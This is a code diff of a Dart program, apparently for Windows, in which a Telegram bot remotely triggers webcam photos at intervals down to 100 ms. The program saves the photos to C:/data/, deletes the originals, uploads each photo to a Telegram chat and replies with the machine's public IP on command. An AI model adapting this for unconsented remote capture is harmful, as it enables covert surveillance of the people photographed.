@@ -75,52 +75,194 @@ void main() async {
       _cameraId = -1;
     } catch (e) {
       try {
-        await bot.api.sendMessage(chat_id, "Failed to find available Camera [1]");
+        await bot.api.sendMessage(chat_id, "Failed to dispose Camera");
       } catch (e) {}
     }
   }
 
   Future<void> takePicture2(int intrvl) async {
     try {
-      await CameraPlatform.instance.dispose(_cameraId);
-      serializeExposureMode(ExposureMode.locked);
-      int cameraId = -1;
-      final int cameraIndex = _cameraIndex % _cameras.length;
-      final CameraDescription camera = _cameras[cameraIndex];
-      cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);
+      if(intrvl == 0){
+        await CameraPlatform.instance.dispose(_cameraId);
+        serializeExposureMode(ExposureMode.locked);
+        int cameraId = -1;
+        final int cameraIndex = _cameraIndex % _cameras.length;
+        final CameraDescription camera = _cameras[cameraIndex];
+        cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);
 
-      final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
-      await CameraPlatform.instance.initializeCamera(cameraId);
-      await initialized;
+        final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
+        await CameraPlatform.instance.initializeCamera(cameraId);
+        await initialized;
 
-      _initialized = true;
-      _cameraId = cameraId;
-      _cameraIndex = cameraIndex;
-      timer = Timer.periodic(new Duration(seconds: intrvl), (timer) async {
-        final XFile file = await CameraPlatform.instance.takePicture(_cameraId);
-
-        String targetPath = "D:/test/";
-        final originalFile = File(file.path);
-        pictureSended = true;
+        _initialized = true;
+        _cameraId = cameraId;
+        _cameraIndex = cameraIndex;
         String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
-        final newFileInTargetPath = await originalFile.copy(targetPath + file.name);
-        await originalFile.delete();
-        if (connectedToNetwork) {
+        final XFile file = await CameraPlatform.instance.takePicture(_cameraId);        
+        try {
+          await CameraPlatform.instance.dispose(_cameraId);
+
+          _initialized = false;
+          _cameraId = -1;
+        } catch (e) {
+          try {
+            await bot.api.sendMessage(chat_id, "Failed to dispose Camera");
+          } catch (e) {}
+        }
+        String targetPath = "C:/data/";
+        final originalFile = File(file.path);
+        try{
+          final originalFile2 = await originalFile.copy( targetPath + newName);
+          await originalFile.delete();
+          if (connectedToNetwork) {
           print("Connected to Network, Sending to Telegram");
           try {
-            await bot.api.sendPhoto(chat_id, InputFile.fromFile(newFileInTargetPath));
+            await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
           } catch (e) {
             print("Failed sending to telegram, Network Disconnected!");
           }
         }
-        newFileInTargetPath.rename(targetPath + newName);
-        if (tpicture) {
-          stopTimer();
-          pictureSended = false;
-          await CameraPlatform.instance.dispose(_cameraId);
-          tpicture = false;
+        }catch(e){
+          try {
+            await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
+            await originalFile.delete();
+          } catch (e) {}
         }
-      });
+      }
+      else if(intrvl < 10){
+        await CameraPlatform.instance.dispose(_cameraId);
+        serializeExposureMode(ExposureMode.locked);
+        int cameraId = -1;
+        final int cameraIndex = _cameraIndex % _cameras.length;
+        final CameraDescription camera = _cameras[cameraIndex];
+        cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);
+
+        final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
+        await CameraPlatform.instance.initializeCamera(cameraId);
+        await initialized;
+
+        _initialized = true;
+        _cameraId = cameraId;
+        _cameraIndex = cameraIndex;
+        timer = Timer.periodic(new Duration(seconds: intrvl), (timer) async {
+          String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
+          final XFile file = await CameraPlatform.instance.takePicture(_cameraId);
+          String targetPath = "C:/data/";
+          final originalFile = File(file.path);
+          // await originalFile.rename("%userprofile%/Pictures/" + newName);
+          try{
+            final originalFile2 = await originalFile.copy( targetPath + newName);
+            await originalFile.delete();
+            if (connectedToNetwork) {
+            print("Connected to Network, Sending to Telegram");
+            try {
+              await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
+            } catch (e) {
+              print("Failed sending to telegram, Network Disconnected!");
+            }
+          }
+          }catch(e){
+            try {
+              await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
+              await originalFile.delete();
+            } catch (e) {}
+          }
+
+          
+        });
+      }
+      else if(intrvl >= 10 && intrvl < 100){
+        timer = Timer.periodic(new Duration(seconds: intrvl), (timer) async {
+          await CameraPlatform.instance.dispose(_cameraId);
+          serializeExposureMode(ExposureMode.locked);
+          int cameraId = -1;
+          final int cameraIndex = _cameraIndex % _cameras.length;
+          final CameraDescription camera = _cameras[cameraIndex];
+          cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);
+
+          final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
+          await CameraPlatform.instance.initializeCamera(cameraId);
+          await initialized;
+
+          _initialized = true;
+          _cameraId = cameraId;
+          _cameraIndex = cameraIndex;
+
+          String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
+          final XFile file = await CameraPlatform.instance.takePicture(_cameraId);          
+          try {
+            await CameraPlatform.instance.dispose(_cameraId);
+
+            _initialized = false;
+            _cameraId = -1;
+          } catch (e) {
+            try {
+              await bot.api.sendMessage(chat_id, "Failed to dispose Camera");
+            } catch (e) {}
+          }
+          String targetPath = "C:/data/";
+          final originalFile = File(file.path);          
+          try{
+            final originalFile2 = await originalFile.copy( targetPath + newName);
+            await originalFile.delete();
+            if (connectedToNetwork) {
+            print("Connected to Network, Sending to Telegram");
+            try {
+              await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
+            } catch (e) {
+              print("Failed sending to telegram, Network Disconnected!");
+            }
+          }
+          }catch(e){
+            try {
+              await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
+              await originalFile.delete();
+            } catch (e) {}
+          }
+        }); 
+      }
+      else if(intrvl >= 100 && intrvl <= 1000){
+        await CameraPlatform.instance.dispose(_cameraId);
+        serializeExposureMode(ExposureMode.locked);
+        int cameraId = -1;
+        final int cameraIndex = _cameraIndex % _cameras.length;
+        final CameraDescription camera = _cameras[cameraIndex];
+        cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);
+
+        final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
+        await CameraPlatform.instance.initializeCamera(cameraId);
+        await initialized;
+
+        _initialized = true;
+        _cameraId = cameraId;
+        _cameraIndex = cameraIndex;
+        timer = Timer.periodic(new Duration(milliseconds: intrvl), (timer) async {
+          String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
+          final XFile file = await CameraPlatform.instance.takePicture(_cameraId);
+          String targetPath = "C:/data/";
+          final originalFile = File(file.path);
+          // await originalFile.rename("%userprofile%/Pictures/" + newName);
+          try{
+            final originalFile2 = await originalFile.copy( targetPath + newName);
+            await originalFile.delete();
+            if (connectedToNetwork) {
+            print("Connected to Network, Sending to Telegram");
+            try {
+              await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
+            } catch (e) {
+              print("Failed sending to telegram, Network Disconnected!");
+            }
+          }
+          }catch(e){
+            try {
+              await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
+              await originalFile.delete();
+            } catch (e) {}
+          }
+
+          
+        });
+      }
     } catch (e) {
       try {
         await bot.api.sendMessage(chat_id, "Error on Taking Picture 2");
@@ -151,7 +293,8 @@ void main() async {
     print("Starting Timer");
     timer.cancel();
     try {
-      await bot.api.sendMessage(chat_id, "Starting Timer Per " + intrvl.toString() + " Seconds");
+      if(intrvl < 100) await bot.api.sendMessage(chat_id, "Starting Timer Per " + intrvl.toString() + " Seconds");
+      else await bot.api.sendMessage(chat_id, "Starting Timer Per " + intrvl.toString() + " Milliseconds");
     } catch (e) {}
     try {
       cameras = await CameraPlatform.instance.availableCameras();
@@ -186,7 +329,7 @@ void main() async {
     _cameraIndex = cameraIndex;
     _cameras = cameras;
     tpicture = true;
-    takePicture2(1);
+    takePicture2(0);
     timer.cancel();
   }
 
@@ -202,11 +345,24 @@ void main() async {
 
     bot.command('p', (ctx) async => startTimer2());
 
+    bot.command('t01', (ctx) async => startTimer(100));
+    bot.command('t02', (ctx) async => startTimer(200));
+    bot.command('t03', (ctx) async => startTimer(300));
+    bot.command('t04', (ctx) async => startTimer(400));
+    bot.command('t05', (ctx) async => startTimer(500));
+    bot.command('t06', (ctx) async => startTimer(600));
+    bot.command('t07', (ctx) async => startTimer(700));
+    bot.command('t08', (ctx) async => startTimer(800));
+    bot.command('t09', (ctx) async => startTimer(900));
     bot.command('t1', (ctx) async => startTimer(1));
     bot.command('t2', (ctx) async => startTimer(2));
     bot.command('t3', (ctx) async => startTimer(3));
     bot.command('t4', (ctx) async => startTimer(4));
     bot.command('t5', (ctx) async => startTimer(5));
+    bot.command('t6', (ctx) async => startTimer(6));
+    bot.command('t7', (ctx) async => startTimer(7));
+    bot.command('t8', (ctx) async => startTimer(8));
+    bot.command('t9', (ctx) async => startTimer(9));
     bot.command('t10', (ctx) async => startTimer(10));
     bot.command('t20', (ctx) async => startTimer(20));
     bot.command('t30', (ctx) async => startTimer(30));
@@ -214,8 +370,6 @@ void main() async {
     bot.command('t50', (ctx) async => startTimer(50));
     bot.command('t60', (ctx) async => startTimer(60));
 
-    bot.command('stopPic', (ctx) async => stopTimer());
-    bot.command('stoppic', (ctx) async => stopTimer());
     bot.command('stop', (ctx) async => stopTimer());
     bot.command('s', (ctx) async => stopTimer());
     bot.command('ip', (ctx) async => await ctx.reply(await getPublicIP()));
